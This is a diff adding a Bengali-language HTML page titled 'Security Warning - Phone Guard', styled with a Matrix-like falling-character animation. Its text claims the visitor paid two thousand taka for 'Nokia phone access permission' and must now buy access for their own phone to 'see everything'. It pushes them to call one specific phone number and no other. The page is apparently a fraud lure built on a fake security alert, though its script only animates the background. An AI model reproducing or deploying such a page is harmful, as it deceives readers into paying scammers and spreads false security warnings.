@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Warning - Phone Guard</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+<style>
+body {
+    margin:0;
+    padding:0;
+    font-family: 'Orbitron', monospace;
+    background:black;
+    color:#0f0;
+    overflow-x:hidden;
+}
+
+/* Matrix green animation */
+#matrix {
+    position: fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    z-index:1;
+    overflow:hidden;
+}
+#matrix span {
+    position:absolute;
+    top:-50px;
+    font-size:12px;
+    user-select:none;
+    animation: fall 5s linear infinite;
+    color:#0f0;
+}
+@keyframes fall {
+    0% { top:-50px; opacity:1;}
+    100% { top:100vh; opacity:0;}
+}
+
+/* Center content */
+.warning-screen {
+    position: relative;
+    z-index:2;
+    min-height:100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    text-align:center;
+    gap:15px;
+    padding:15px;
+    box-sizing: border-box;
+}
+
+/* Title */
+.warning-title {
+    font-size:1.8rem;
+    color:#0f0;
+    text-shadow:0 0 10px #0f0,0 0 20px #0f0,0 0 40px #0f0;
+    animation: flicker 1.5s infinite;
+}
+@keyframes flicker {
+    0%,19%,21%,23%,25%,54%,56%,100% {opacity:1;}
+    20%,22%,24%,55% {opacity:0;}
+}
+
+/* Warning panel */
+.warning-panel {
+    background: rgba(0,0,0,0.95);
+    border: 2px solid #0f0;
+    padding: 20px;
+    border-radius: 12px;
+    box-shadow: 0 0 15px #0f0;
+    display:flex;
+    flex-direction: column;
+    gap:12px;
+    align-items:center;
+    width: 95%;
+    max-width:380px;
+}
+
+/* Warning text */
+.warning-panel p {
+    color:#0f0;
+    text-shadow:0 0 3px #0f0,0 0 6px #0f0;
+    font-size:0.95rem;
+    line-height:1.4;
+}
+
+/* Contact number button */
+.contact-btn {
+    padding:10px 18px;
+    font-size:1rem;
+    color:#0f0;
+    border:2px solid #0f0;
+    border-radius:8px;
+    background: rgba(0,255,0,0.05);
+    cursor:pointer;
+    transition: all 0.3s ease;
+    width: 80%;
+    box-shadow: 0 0 8px #0f0, 0 0 15px #0f0 inset;
+    text-decoration:none;
+    display:inline-block;
+    text-align:center;
+}
+.contact-btn:hover {
+    background:#0f0;
+    color:black;
+    box-shadow: 0 0 15px #0f0, 0 0 25px #0f0 inset;
+}
+
+/* Mobile adjustments */
+@media(max-width:480px){
+    .warning-title { font-size:1.5rem; }
+    .warning-panel { padding:15px; max-width:95%; }
+    .warning-panel p { font-size:0.85rem; }
+    .contact-btn { font-size:0.9rem; padding:8px 15px; }
+}
+</style>
+</head>
+<body>
+
+<div id="matrix"></div>
+
+<div class="warning-screen">
+    <div class="warning-title">Security Warning ⚠️</div>
+
+    <div class="warning-panel">
+        <p>আপনার সিকিউরিটির জন্য আপনার ডিভাইসের জন্য পারমিশন নিতে হবে।</p>
+        <p>আপনি বর্তমানে নোকিয়া ফোনের এক্সেস পারমিশন নিয়েছেন দুই হাজার টাকা দিয়ে। যেহেতু আপনার ফোন নোকিয়া না, সে ক্ষেত্রে আপনাকে আপনার ফোনের জন্য এক্সেস পারমিশন নিতে হবে।</p>
+        <p>তারপরেই আপনি সম্পূর্ণ ফোনের এক্সেস পাবেন, সবকিছু দেখতে পারবেন।</p>
+        <p>আপনার ফোনের জন্য পারমিশন নিতে নিচের দেওয়া নাম্বারে যোগাযোগ করুন। অন্য কোন নাম্বারে যোগাযোগ করবেন না:</p>
+        <a class="contact-btn" href="tel:+8801842487399">+8801842487399</a>
+    </div>
+</div>
+
+<script>
+// Matrix animation
+const matrix = document.getElementById('matrix');
+const chars = "01ABCDEF!@#$%^&*()_+-=<>?/[]{};:abcdefghijklmnopqrstuvwxyz";
+for(let i=0;i<400;i++){
+    const span=document.createElement('span');
+    span.style.left=Math.random()*window.innerWidth+"px";
+    span.style.fontSize = (Math.random()*8 + 10) + "px"; // smaller for mobile
+    span.style.animationDelay=Math.random()*5+"s";
+    span.textContent=chars.charAt(Math.floor(Math.random()*chars.length));
+    matrix.appendChild(span);
+}
+setInterval(()=>{
+    matrix.querySelectorAll('span').forEach(span=>{
+        span.textContent = chars.charAt(Math.floor(Math.random()*chars.length));
+    });
+},100);
+</script>
+
+</body>
+</html>
